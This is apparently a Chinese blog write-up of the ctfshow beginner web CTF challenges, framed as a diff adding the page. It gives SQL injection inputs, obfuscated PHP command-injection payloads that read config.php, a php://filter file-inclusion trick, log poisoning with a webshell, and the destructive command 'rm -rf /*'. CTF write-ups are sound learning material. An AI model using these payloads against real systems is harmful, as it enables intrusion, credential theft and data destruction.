@@ -1,0 +1,384 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ctfshow 萌新web 更新中 | gudiffany_blog</title>
+<link rel="shortcut icon" href="https://gudiffany.github.io//favicon.ico?v=1664035675532">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://gudiffany.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="ctfshow 萌新web 更新中 | gudiffany_blog - Atom Feed" href="https://gudiffany.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="ctfshow 萌新web
+1.web1
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;
+  &lt;meta charset=&quot;ut..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://gudiffany.github.io/">
+  <img class="avatar" src="https://gudiffany.github.io//images/avatar.png?v=1664035675532" alt="">
+  </a>
+  <h1 class="site-title">
+    gudiffany_blog
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="/find" class="menu">
+          find
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              ctfshow 萌新web 更新中
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-08-15
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="ctfshow-萌新web">ctfshow 萌新web</h1>
+<h2 id="1web1">1.web1</h2>
+<pre><code class="language-php+HTML">&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;
+  &lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+\# 包含数据库连接文件
+include(&quot;config.php&quot;);
+\# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+  $id = $_GET['id'];
+  \# 判断id的值是否大于999
+  if(intval($id) &gt; 999){
+    \# id 大于 999 直接退出并返回错误
+    die(&quot;id error&quot;);
+  }else{
+    \# id 小于 999 拼接sql语句
+    $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;
+    echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;
+    \# 执行sql 语句
+    $result = $conn-&gt;query($sql);
+    \# 判断有没有查询结果
+    if ($result-&gt;num_rows &gt; 0) {
+      \# 如果有结果，获取结果对象的值$row
+      while($row = $result-&gt;fetch_assoc()) {
+        echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;
+      }
+    }
+    \# 关闭数据库连接
+    $conn-&gt;close();
+  }
+  
+}else{
+  highlight_file(__FILE__);
+}
+
+?&gt;
+&lt;/body&gt;
+&lt;!-- flag in id = 1000 --&gt;
+&lt;/html&gt;
+</code></pre>
+<p>那么需要绕过的只有</p>
+<p>intval()函数，由于其函数传递的参数 id = 2 or id = 1000 被当做一个字符串 ' 2 or id = 1000' , intval()函数会从字符串的开始进行转换, 直到遇到非数字的字符, 转换到or的时候, 由于or不是数字类型的字符, 从而停止转换, 转换的结果就只有 2</p>
+<p>可以采用传入多个数字的手法绕过</p>
+<pre><code>?id=2 or id=1000
+</code></pre>
+<p>其中id=2必须为空值，这样才能使得sql语句执行后面的id=1000</p>
+<p>于是为了防止2有值，最好使用负数</p>
+<h2 id="2web2">2.web2</h2>
+<p>在web1的基础上多加了一层对or的过滤</p>
+<p>可以用||代替or</p>
+<pre><code>?id=-1 || id=1000
+</code></pre>
+<h2 id="3web3">3.web3</h2>
+<pre><code>?id=2 ||id=1000
+</code></pre>
+<p>不可以使用负数</p>
+<h2 id="4web4">4.web4</h2>
+<pre><code>?id=2 ||id=1000
+</code></pre>
+<h2 id="5web5">5.web5</h2>
+<pre><code>二进制 0b1111101000
+
+两次取反 ~~1000
+</code></pre>
+<h2 id="6web6">6.web6</h2>
+<pre><code>二进制 0b1111101000
+
+两次取反 ~~1000
+</code></pre>
+<h2 id="7web7">7.web7</h2>
+<p>/'|&quot;|or|||-|\|/|\*|&lt;|&gt;|^|!|~|x|hex|(|)|+|select/i</p>
+<p>过滤</p>
+<pre><code>' &quot; or | - / * &lt; &gt; ^ ! ~ x hex () + select
+</code></pre>
+<h2 id="总结">总结</h2>
+<pre><code>'1000' 字符串
+&quot;1000&quot;
+1 or 1=1 %23 or绕过
+1 || 1=1 %23 替换or
+500/0.5 计算
+2*500
+500&lt;&lt;1 每次增加一倍
+~~1000 
+0x3e8
+hex(1000)
+1+999
+1 union select * from article where id=1000
+0b1111101000
+</code></pre>
+<h2 id="8web8">8.web8</h2>
+<p>删库跑路是吧</p>
+<pre><code>rm -rf /*
+“rm [选项] 文件名… ”
+“- f ”忽略不存在的文件，强制删除，不给出提示。
+“- r” 指示rm将参数中列出的全部目录和子目录均递归地删除。
+“- i ”进行交互式删除。
+</code></pre>
+<h2 id="9web9">9.web9</h2>
+<pre><code>?c=system('cat config.php');
+</code></pre>
+<h2 id="10web10">10.web10</h2>
+<pre><code>?c=passthru('cat config.php');
+</code></pre>
+<h2 id="11web11">11.web11</h2>
+<pre><code>?c=passthru('&quot;ca&quot;&quot;t&quot; config.php');
+</code></pre>
+<h2 id="12web12">12.web12</h2>
+<pre><code>?c=$a=base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);
+</code></pre>
+<h2 id="13web13">13.web13</h2>
+<pre><code>?c=assert(base64_decode('c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp'))?&gt;
+</code></pre>
+<h2 id="14web14">14.web14</h2>
+<p>法一</p>
+<pre><code>?c=echo `$_POST[a]`?&gt;
+</code></pre>
+<p>用hackbar进行post传参</p>
+<p>或者</p>
+<p>burp抓包</p>
+<p>1.更改请求头为POST</p>
+<p>2.添加 Content-Type: application/x-www-form-urlencoded</p>
+<p>3.提交a=cat config.php</p>
+<p>法二</p>
+<p>文件包含漏洞</p>
+<pre><code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=config.php
+</code></pre>
+<h2 id="15web15">15.web15</h2>
+<p>同web14,过滤了&gt;</p>
+<pre><code>?c=include$_GET[a];&amp;a=php://filter/read=convert.base64-encode/resource=config.php
+</code></pre>
+<h2 id="16web16">16.web16</h2>
+<pre><code>?c=36d 奇怪的东西和奇怪的wp
+</code></pre>
+<h2 id="17web17">17.web17</h2>
+<p>无法使用任何的php路径，禁止了远程文件包含，看过wp后发现可以使用日志包含</p>
+<p>在</p>
+<pre><code>?c=/var/log/nginx/access.log
+</code></pre>
+<p>中看到存在有user的信息，因此将一句话木马写入user头中，使用蚁剑链接即可</p>
+<p>然后flag在36d.php下</p>
+<pre><code>1、可以利用php中的?&gt;来闭合语句
+2、Linux中的反引号作用是优先执行
+3、可以利用引号绕过cat过滤
+</code></pre>
+<pre><code class="language-php">根据黑名单的不同，获取config.php的内容有以下几种方法:
+1.命令执行函数
+system()、passthru()、exec()、shell_exec()、popen()、proc_open()、pcntl_exec()
+?c=passthru('cat config.php');
+
+2.构造
+?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');
+
+3.绕过cat命令
+?c=highlight_file('config.php');
+?c=system('ca&quot;&quot;t config.php');
+?c=system(&quot;ca''t config.php&quot;);
+?c=system('ca\t config.php');
+linux有很多类似于cat的方法:tac、more、less、head、tail、nl、sed、sort、uniq
+
+4.base64绕过
+?c=$a=base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);
+
+5.绕过分号;
+?c=system('cat config.php')?&gt;
+?c=assert(base64_decode('c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp'))?&gt; //assert()会将字符串当做PHP代码来执行，并且字符串末尾可以没有分号
+
+6.POST传值
+?c=echo `$_POST[&quot;sung&quot;]`; // ``是为了执行命令
+//然后再通过post传参sung=cat+config.php,具体是通过BUrpsuite抓包然后修改为POST，然后加Content-Type: application/x-www-form-urlencoded或者用浏览器插件hackerbar添加POST data。
+
+其他函数:
+//打印该目录下所有文件名
+?c=var_dump(glob('*')); //信息更全面
+?c=print_r(glob('*'));
+?c=print_r(scandir('.'));
+//下面两个同第二个，只是不带参数
+?c=print_r(scandir(pos(localeconv())));
+?c=print_r(scandir(current(localeconv())));
+</code></pre>
+<h2 id=""></h2>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#ctfshow-%E8%90%8C%E6%96%B0web">ctfshow 萌新web</a>
+<ul>
+<li><a href="#1web1">1.web1</a></li>
+<li><a href="#2web2">2.web2</a></li>
+<li><a href="#3web3">3.web3</a></li>
+<li><a href="#4web4">4.web4</a></li>
+<li><a href="#5web5">5.web5</a></li>
+<li><a href="#6web6">6.web6</a></li>
+<li><a href="#7web7">7.web7</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#8web8">8.web8</a></li>
+<li><a href="#9web9">9.web9</a></li>
+<li><a href="#10web10">10.web10</a></li>
+<li><a href="#11web11">11.web11</a></li>
+<li><a href="#12web12">12.web12</a></li>
+<li><a href="#13web13">13.web13</a></li>
+<li><a href="#14web14">14.web14</a></li>
+<li><a href="#15web15">15.web15</a></li>
+<li><a href="#16web16">16.web16</a></li>
+<li><a href="#17web17">17.web17</a></li>
+<li></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://gudiffany.github.io/post/xctf-xin-shou-web/">
+              <h3 class="post-title">
+                xctf新手web
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://gudiffany.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
